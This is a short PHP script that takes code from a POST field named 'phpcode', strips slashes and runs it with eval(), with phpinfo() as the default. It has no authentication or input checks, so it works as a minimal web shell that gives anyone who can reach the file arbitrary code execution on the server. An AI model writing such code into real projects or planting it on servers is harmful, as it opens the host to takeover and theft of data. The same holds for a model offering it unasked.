<?php
$phpcode = isset($_POST['phpcode']) ? $_POST['phpcode'] : "phpinfo();";
	
echo "<br><br>";
eval(stripslashes($phpcode));
?>
